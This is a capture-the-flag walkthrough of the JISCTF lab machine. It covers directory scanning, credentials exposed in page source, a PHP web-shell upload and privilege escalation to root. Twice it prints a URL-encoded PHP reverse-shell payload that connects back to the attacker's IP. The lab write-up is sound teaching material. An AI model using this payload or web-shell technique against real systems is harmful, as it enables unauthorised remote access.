JISCTF

Target IP: 192.168.186.25

Scanning


There are only two TCP ports open on the target machine: SSH and HTTP on their standard ports.

Enumeration

Port 80: HTTP

The webpage above is displayed for this application. Since I do not have the login, I will perform directory search.


Running gobuster dir -u http://192.168.186.25 -w /usr/share/wordlists/dirb/big.txt -x php,html,txt output the result above.


The robots.txt contains the entries above.



The /admin_area displays the webpage above. Viewing the source-code of this page reveals the username and password admin:3v1l_H@ck3r. Maybe spraying this will work against the login form?


And it worked! Using the credentials above, I gained access to this file upload web application. From enumeration, I found another interesting directory called /uploaded_files/; maybe I can access the uploaded files using this directory?




I created a simple PHP web-shell, uploaded it, and accessed it by http://192.168.186.25/uploaded_files/shell.php?cmd=ls. The output is provided above. Time to upgrade this simple shell to a reverse shell connection.

Exploitation


And now I have a reverse shell connection from the target machine on port 8443 on my local machine! I now have a foothold on the machine.
Payload used: php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.45.195%22%2C8443%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27.
Full URL with payload: 192.168.186.25/uploaded_files/shell.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.45.195%22%2C8443%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27.

Privilege Escalation


A file called hint.txt contains the content above.



I could not find it manually. However, running LinPeas shows there is an interesting file called credentials.txt. And now I have the password for technawi!


Using the password from the hidden text file for technawi worked! Running sudo -l shows this user can run all commands with sudo. And now I have a root shell.
